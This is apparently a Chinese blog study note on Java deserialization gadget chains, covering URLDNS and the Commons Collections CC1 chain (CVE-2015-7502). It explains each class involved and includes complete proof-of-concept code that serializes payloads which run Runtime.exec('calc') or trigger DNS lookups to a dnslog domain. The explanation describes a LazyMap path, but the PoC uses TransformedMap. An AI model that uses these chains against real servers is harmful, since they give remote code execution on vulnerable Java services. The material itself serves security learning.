---
title: Java CC链整合学习
date: 2026-07-16 20:59:54
tags:
---

在开始之前推荐一个网站

[Java反序列化漏洞Gadget Chain可视化图谱工具](https://gb233.github.io/Gadget_Chain/)

这里有很多经典的Java反序列化漏洞的链子的可视化图谱，每一步都做了详细的解释，学习起来非常方便

# URLDNS

适用版本：无

主要用于探测反序列化点

```java
ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());//接受一段字节流
Object obj = ois.readObject();//执行反序列化
```

当你调用 `ois.readObject()` 时，Java 虚拟机（JVM）会执行以下步骤：

1. 读取字节流，重建对象。
2. 在重建对象的过程中，**自动调用**该对象的 `readObject()` 方法（如果定义了）。

在URLDNS链中重建的对象就是HashMap

```java
HashMap.readObject(java.io.ObjectInputStream s) :
for (int i = 0; i < mappings; i++) {
    @SuppressWarnings("unchecked")
    K key = (K) s.readObject();
    @SuppressWarnings("unchecked")
    V value = (V) s.readObject();
    putVal(hash(key), key, value, false, false);
}
```

这个方法在执行`hash(key)`的时候会调用`key.hashCode()`

```java
public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
```

默认的 `URLStreamHandler.hashCode()` 会尝试解析域名，我们只需要控制域名就能进行一次DNS查询

```java
import java.io.*;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;

public class Main {
    public static void main(String[] args) throws Exception {
        HashMap<Object, Object> hashMap = new HashMap<>();
        URL url = new URL("http://poeh21.dnslog.cn.");
        hashMap.put(url, null);
        ser(hashMap);
        deser();
    }
    public static void ser(Object obj) throws Exception {
        FileOutputStream fos = new FileOutputStream("data.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(obj);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        byte[] bytes = baos.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(bytes));
    }

    public static void deser() throws Exception{
        FileInputStream fis = new FileInputStream("data.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
    }
}
```

成功打通

![image-20260716221918230](https://gitee.com/bobrocket/img/raw/master/image-20260716221918230.png)

```
Gadget chain:
ObjectInputStream.readObject()
    HashMap.readObject()
        URL.hashCode()
```



# CC1

CVE-2015-7502

适用版本：Apache Commons Collections 3.2.1及以下版本，JDK 版本8u71 之前（8u71 修复了 `AnnotationInvocationHandler.readObject()`）

## AnnotationInvocationHandler入口类

```java
// sun.reflect.annotation.AnnotationInvocationHandler (JDK 内部类)
private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException {
    s.defaultReadObject();   // ① 读取所有成员字段：type 和 memberValues

    // ② 关键：从 memberValues 中获取 key 为 "memberValues" 的值
    // 注意：memberValues 是一个 Map，这里调用 Map.get()
    Object memberValuesObj = memberValues.get("memberValues");

    // ③ 后续还有一些检查，但上面这一行已经触发了攻击
    // 如果 memberValues 是 LazyMap，而 "memberValues" 这个 key 不存在，
    // 就会触发 LazyMap.get() 的“惰性生成”逻辑
}
```

## LazyMap触发类

```java
// org.apache.commons.collections.map.LazyMap
public class LazyMap extends AbstractMapDecorator implements Serializable {
    private final Transformer factory;

    public Object get(Object key) {
        // 检查 map 中是否包含该 key
        if (!map.containsKey(key)) {   // "memberValues" 这个 key 不存在于空 HashMap 中
            Object value = factory.transform(key);  // ← 调用工厂的 transform()
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
}
```

- `map` 是一个空 `HashMap`，所以 `map.containsKey("memberValues")` 返回 `false`。
- 于是调用 `factory.transform(key)`，其中 `key` 是字符串 `"memberValues"`，`factory` 是 `ChainedTransformer` 实例。

## 核心Transformer类

### ChainedTransformer

将多个 `Transformer` 串联成一条执行链——`transform(input)` 会依次调用每个 `Transformer`，前一个的输出作为后一个的输入。

```java
// org.apache.commons.collections.functors.ChainedTransformer
public class ChainedTransformer implements Transformer, Serializable {
    private final Transformer[] iTransformers;
    public Object transform(Object object) {
        // 逐个执行 iTransformers 数组中的每个 Transformer
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object); // 前一个输出作为后一个输入
        }
        return object;
    }
}
```

初始输入 `object = "memberValues"`（字符串）

数组中有 4 个 Transformer，依次执行：

### 1.ConstantTransformer

```java
// org.apache.commons.collections.functors.ConstantTransformer
public class ConstantTransformer implements Transformer, Serializable {
    private final Object iConstant;

    public ConstantTransformer(Object constantToReturn) {
        iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return iConstant;  // 忽略输入，始终返回构造时传入的对象
    }
}
```

- **输入**：`"memberValues"`（忽略）
- **输出**：`Runtime.class`（即 `java.lang.Runtime` 的 Class 对象）

### 2.InvokerTransformer

```java
// org.apache.commons.collections.functors.InvokerTransformer
public class InvokerTransformer implements Transformer, Serializable {
    private final String iMethodName;
    private final Class<?>[] iParamTypes;
    private final Object[] iArgs;

    public Object transform(Object input) {
        if (input == null) return null;
        // 通过反射调用 input 对象的指定方法
        Class<?> cls = input.getClass();               // input = Runtime.class
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);
    }
}
```

- **构造参数**：`iMethodName = "getMethod"`, `iParamTypes = [String.class, Class[].class]`, `iArgs = ["getRuntime", []]`
- **输入**：`Runtime.class`（Class 对象）
- **反射调用**：`Runtime.class.getMethod("getRuntime")`
- **输出**：`Method` 对象，表示 `Runtime.getRuntime()` 方法

### 3.InvokerTransformer

- **构造参数**：`iMethodName = "invoke"`, `iParamTypes = [Object.class, Object[].class]`, `iArgs = [null, []]`
- **输入**：上一步得到的 `Method` 对象（`Runtime.getRuntime` 方法）
- **反射调用**：`method.invoke(null)` → 相当于调用 `Runtime.getRuntime()`
- **输出**：`Runtime` 实例（即 `Runtime.getRuntime()` 的返回值）

### 4.InvokerTransformer

- **构造参数**：`iMethodName = "exec"`, `iParamTypes = [String.class]`, `iArgs = ["calc"]`
- **输入**：上一步得到的 `Runtime` 实例
- **反射调用**：`runtime.exec("calc")`
- **输出**：`Process` 对象（计算器已启动）



把核心Transformer整合起来就是：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.ChainedTransformer;

public class Test {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[]{
		    new ConstantTransformer(Runtime.class),
		    new InvokerTransformer("getMethod",
		        new Class[]{String.class, Class[].class},
		        new Object[]{"getRuntime", new Class[0]}),
		    new InvokerTransformer("invoke",
		        new Class[]{Object.class, Object[].class},
		        new Object[]{null, new Object[0]}),
		    new InvokerTransformer("exec",
		        new Class[]{String.class},
		        new Object[]{"calc.exe"})
};

        ChainedTransformer chain = new ChainedTransformer(transformers);

		// 触发整个链
		chain.transform("任意输入");  // → 打开计算器
	}
}
javac -cp commons-collections-3.2.2.jar Test.java
java -cp .;commons-collections-3.2.2.jar Test
```

## 完整利用链

至此我们可以写出完整的利用链了

```
ObjectInputStream.readObject()
  → AnnotationInvocationHandler.readObject()
    → Proxy.entrySet()
      → AnnotationInvocationHandler.invoke()
        → LazyMap.get()
          → ChainedTransformer.transform()
            → InvokerTransformer.transform()
              → Runtime.exec()
```

poc

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        ConstantTransformer ct = new ConstantTransformer(Runtime.class);

        String methodName1 = "getMethod";
        Class[] paramTypes1 = {String.class, Class[].class};
        Object[] args1 = {"getRuntime", null};
        InvokerTransformer it1 = new InvokerTransformer(methodName1, paramTypes1, args1);

        String methodName2 = "invoke";
        Class[] paramTypes2 = {Object.class, Object[].class};
        Object[] args2 = {null, null};
        InvokerTransformer it2 = new InvokerTransformer(methodName2, paramTypes2, args2);

        String methodName3 = "exec";
        Class[] paramTypes3 = {String.class};
        Object[] args3 = {"calc"};
        InvokerTransformer it3 = new InvokerTransformer(methodName3, paramTypes3, args3);

        Transformer[] transformers = {ct, it1, it2, it3};
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        /*
        ChainedTransformer
        */

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", ""); 
        Map decorated = TransformedMap.decorate(map, null, chainedTransformer);
        /*
        TransformedMap.decorate
        */

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annoConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        annoConstructor.setAccessible(true);
        Object poc = annoConstructor.newInstance(Target.class, decorated); 
        /*
        AnnotationInvocationHandler
        */

        serial(poc);
        unserial();
    }

    public static void serial(Object obj) throws IOException {
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("./cc1.bin"));
        out.writeObject(obj);
    }

    public static void unserial() throws IOException, ClassNotFoundException {
        ObjectInputStream in = new ObjectInputStream(new FileInputStream("./cc1.bin"));
        in.readObject();
    }
}
```





























# 参考文献

[0基础入门java安全（一）--CC1基础分析 - E73RN4L - 博客园](https://www.cnblogs.com/E73RN4L/p/21263313)

[CC、CB链整合篇-先知社区](https://xz.aliyun.com/news/18859)
